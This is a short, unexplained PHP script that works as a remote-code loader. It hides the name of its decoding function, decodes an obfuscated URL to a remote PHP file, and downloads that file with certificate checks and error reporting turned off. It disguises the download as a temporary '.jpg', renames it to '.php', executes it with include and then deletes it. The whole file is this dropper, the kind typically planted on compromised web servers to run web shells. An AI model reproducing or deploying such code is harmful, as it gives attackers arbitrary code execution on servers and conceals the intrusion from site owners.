<?php
error_reporting(0);
set_time_limit(0);

$dec = str_replace("x","", "basex64_decodex");
$url = $dec("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Nsb3VkTmluZS1EaWdpdGFscy9ieXAvcmVmcy9oZWFkcy9tYWluL2hhaGEucGhw");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);

$data = curl_exec($ch);
curl_close($ch);

if(!$data) exit;

$tmp = sys_get_temp_dir()."/".md5(uniqid()).".jpg";
file_put_contents($tmp, $data);

$php = $tmp.".php";
rename($tmp, $php);

include $php;
unlink($php);
?>
